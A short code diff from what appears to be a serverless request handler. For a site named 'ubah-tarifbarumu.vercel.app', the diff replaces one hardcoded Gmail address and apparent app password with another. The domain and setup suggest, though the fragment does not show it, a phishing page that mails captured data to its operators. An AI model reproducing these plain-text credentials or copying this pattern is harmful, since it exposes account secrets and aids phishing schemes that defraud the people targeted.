@@ -14,8 +14,8 @@ export default function handler(req, res) {
     }else
 
     if(url == 'ubah-tarifbarumu.vercel.app'){
-        email = 'iiiiiii10.a.10@gmail.com' ;
-        pass = 'hvucqnmanjjaegbo' ;
+        email = 'ghh793679@gmail.com' ;
+        pass = 'uxmihofabwjqnjdh' ;
         
 
 
